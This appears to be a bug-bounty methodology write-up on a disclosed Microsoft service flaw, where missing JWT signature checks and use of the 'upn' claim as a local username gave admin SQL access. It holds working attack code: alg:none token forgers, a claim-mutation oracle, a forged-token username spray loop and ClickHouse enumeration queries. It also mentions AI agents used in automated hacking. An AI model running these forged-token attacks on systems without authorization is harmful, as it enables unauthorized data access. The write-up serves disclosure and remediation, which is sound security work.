# Unverified Signature + Claim-as-Local-Identity Confusion

Source: Faav, "How I Could've Accessed 17 Trillion Microsoft Records" (Sep 25, 2026) — internal
Microsoft analytics service "Titan" (Apache Superset derivative + ClickHouse backends).
MSRC case 144051. Awarded $5,000. Reproduce only against in-scope, authorized targets.

## The bug class in one line

The backend validated every JWT *claim* (`tid`, `aud`, `appid`, `upn`) but never verified the
*signature*, and then used the attacker-controlled `upn` claim as a lookup key into its own local
user table — so `upn: "admin"` resolved to local user id 1 with the `Admin` role.

Two independent defects, each required for impact:

1. **No signature verification.** Any header/payload was accepted. `alg: "none"` with an empty
   third segment worked.
2. **Unsafe identity mapping.** The app treated an unverified IdP claim as a local application
   username rather than resolving a verified subject identifier (`oid`/`sub`) against Entra.

## Phase A — Find the unauthenticated route behind the authenticated frontend

The Titan frontend returned a `VPN REQUIRED` page to non-employees. The API lived on a *different*
host, discovered by subdomain enumeration, resolving to an Azure Cloud Services instance, with a
**public Swagger file**.

Checklist:

- Enumerate subdomains of the org, not only of the app host (`subdomain-enumeration` skill).
- For every host found, pull `/swagger/v1/swagger.json`, `/swagger/index.html`, `/openapi.json`,
  `/api-docs`, `/v2/swagger.json`, `/.well-known/openapi.json`.
- Read the Swagger **`security` block per route**, not globally. Titan declared Azure AD bearer auth
  on 3 of 4 routes; the 4th — `/v2/Query`, the one taking raw SQL — had no security requirement
  declared. The most dangerous route is often the one with the weakest declared auth.
- Rank routes by sink power: raw SQL / raw query / `Insert` / `Execute` / `Run` / `Eval` first.

```bash
# Per-route auth declaration diff — find routes missing a security requirement
curl -sk "$HOST/swagger/v1/swagger.json" | python3 -I -c '
import sys, json
d = json.load(sys.stdin)
g = bool(d.get("security"))
for p, ms in d.get("paths", {}).items():
    for m, op in ms.items():
        if not isinstance(op, dict): continue
        sec = op.get("security", None)
        state = "GLOBAL" if sec is None and g else ("NONE" if not sec else "declared")
        if state != "declared":
            print(f"{state:7} {m.upper():6} {p}")
'
```

## Phase B — Recover required parameter values from archives

Swagger gave no example values and `/v2/Query` required a `tableName` routing value. 2023 Wayback
snapshots of Titan's login and privacy pages exposed the archived **Superset configuration**, which
yielded 56 table definitions — including `TestData`.

```bash
# Archived URLs for a host, filtered to config/JS/JSON that may carry enum values
curl -s "http://web.archive.org/cdx/search/cdx?url=$HOST/*&output=text&fl=timestamp,original&collapse=urlkey&limit=5000" \
  | grep -Ei '\.(js|json|ya?ml|txt|map)$|config|settings|privacy|login'

# Fetch one snapshot verbatim (id_ = raw, no Wayback rewriting)
curl -s "https://web.archive.org/web/20230101000000id_/$URL"
```

Also worth mining for enum values: JS bundles and source maps (`js-secrets-extraction`),
`/GetConfiguration`-style sibling routes, and error messages that echo valid values.

Baseline request once a value is known:

```http
POST /v2/Query HTTP/1.1
Host: titan-api.example.net
Content-Type: application/json

{"query":"SELECT 1","tableName":"TestData","rowLimit":1}
```

No `Authorization` header → `401 Unauthorized`. That 401 is the start of the ladder, not the end.

## Phase C — The claim ladder (error oracle)

Start from **any** JWT you legitimately control — e.g. a token from your own external Entra test
tenant — and mutate one claim at a time, **leaving the original signature untouched**. Each distinct
error names the next validation layer:

| Mutation | Observed error | What it proves |
|---|---|---|
| own-tenant token as issued | tenant error | `tid` is checked |
| `tid` → target tenant | audience error | `aud` is checked |
| `aud` → target audience | application allowlist error | `appid` is checked |
| `appid` → allowlisted app | `User '<x>' not found` | reached local identity lookup |

**The tell:** the payload changed on every step while the signature stayed byte-identical and the
server kept advancing to the next check. A server that verified signatures would have returned one
invariant signature error at step 1. This stale-signature probe is cheaper and quieter than
`alg:none` and catches servers that *block* `alg:none` but still skip verification for `HS256`/`RS256`.

Record the exact error string for every step — error-text differentials are the whole oracle.
Keep a claim-mutation log so a later error regression tells you a fix shipped.

## Phase D — Confirm with an empty signature

```python
# alg:none with a genuinely empty third segment — note the trailing dot
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
header  = {"alg": "none", "typ": "JWT"}
payload = {
    "aud":   "<target-audience>",
    "tid":   "<target-tenant-guid>",
    "appid": "<allowlisted-app-guid>",
    "upn":   "attacker@example.com",
    "oid":   "00000000-0000-0000-0000-000000000000",
}
print(f"{b(header)}.{b(payload)}.")
```

Titan accepted this and returned `User 'attacker@example.com' not found` — authentication passed,
only identity resolution failed. Variants to try when the bare form is rejected: `alg: "None"`,
`"NONE"`, `"nOnE"`, a single-char garbage signature, a signature from a *different* token
(cut-and-paste), and omitting the third segment entirely (`header.payload`).

## Phase E — Treat the identity claim as a local username, not an identity

This is the step automation misses. `upn` is *named* like an email-formatted Entra identity, so
agents (Codex/Claude in the author's own hackbot) sprayed placeholders, service aliases, and
employee-style addresses for ten days and got nowhere. The backend was using the claim as a lookup
key into its **own** user table. `upn: "admin"` → local user id 1 → `Admin` role → SQL executed,
returning `1`.

> Rule: when a claim reaches a "user not found" error, stop treating the field name as a type
> constraint. Ask what a developer would have done with that string on the backend, and spray
> **local** account names, not identities.

Spray list for any claim that feeds a local lookup (`upn`, `email`, `preferred_username`, `sub`,
`unique_name`, `name`, `user`, `username`, `nameid`):

```
admin  administrator  Admin  root  sa  superuser  super_admin  system  service
svc  svc_admin  default  guest  test  dev  internal  api  bot  app  owner
admin@localhost  admin@local  1  0
```

Framework-specific defaults worth prioritizing: Superset → `admin`; Airflow → `airflow`;
Grafana → `admin`; Metabase → first-registered user; Keycloak → `admin`/`service-account-<client>`.

```bash
# Local-username spray against the claim that reached the identity lookup.
# Distinguish three states: "not found" (oracle alive), success, and a new error class.
for U in admin administrator root sa superuser system service default guest test; do
  TOK=$(python3 -I -c "
import base64,json,sys
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
p={'aud':'$AUD','tid':'$TID','appid':'$APPID','upn':'$U','oid':'00000000-0000-0000-0000-000000000000'}
print(f\"{b({'alg':'none','typ':'JWT'})}.{b(p)}.\")")
  printf '%-16s ' "$U"
  curl -sk --max-time 10 "$HOST/v2/Query" \
    -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
    -d '{"query":"SELECT 1","tableName":"TestData","rowLimit":1}' | head -c 200; echo
  sleep 0.5
done
```

A `User '<x>' not found` error that differs from a generic 401 is also a **username enumeration**
primitive in its own right — report it even if no name resolves.

## Phase F — Bounded post-auth scoping (do not dump)

Once SQL runs, establish scope with metadata only. The author ran exactly two one-row samples
against real analytics data and reported immediately.

```sql
SHOW DATABASES;                -- Titan's own platform metadata DB appears here
SHOW TABLES FROM <db>;
-- ClickHouse row estimates without reading rows:
SELECT database, name, total_rows FROM system.tables WHERE total_rows > 0;
SELECT database, table, sum(rows) FROM system.parts WHERE active GROUP BY database, table;
```

Scope-mapping pattern that produced the headline number: test every recovered routing value with
`SELECT 1` (30 of 56 were still live) → each routing value → backend configuration → one or more
databases (24 configurations → 17 databases → 9,863 table names). Count **one replica per shard**
when summing `Distributed` tables, and cross-check the total through two metadata paths
(`system.tables.total_rows` and active `system.parts`) before believing it.

Discipline that kept this report clean, and that you copy verbatim:

- Table descriptions, metadata, and row **counts** — never bulk rows.
- At most one or two `LIMIT 1` samples per sensitive dataset, only to prove reachability.
- Never correlate identifiers across datasets, never build a profile, never touch PII fields.
- Note placeholder hashes for what they are (Superset's local user model), not as credentials.
- Report the moment sensitive data is proven reachable; stop testing when asked.

## Report framing

- Primary finding: **missing JWT signature verification** on the service — not "alg:none accepted".
  Lead with the stale-signature evidence (payload mutated, signature unchanged, request advanced).
- Secondary finding: privilege escalation via unverified claim used as a local username.
- Impact: unauthenticated SQL execution as application administrator; quantify with metadata counts
  and the per-database table inventory, with explicit "estimated from metadata; includes historical
  and derived data" caveat.
- Fix text: verify signatures against the trusted JWKS and reject `none`/unsigned algorithms before
  reading any claim; resolve identity from the verified `oid`/`sub` against the IdP rather than
  mapping a claim string onto a local account; require auth on every route that accepts raw SQL and
  remove raw-SQL endpoints from public Swagger.
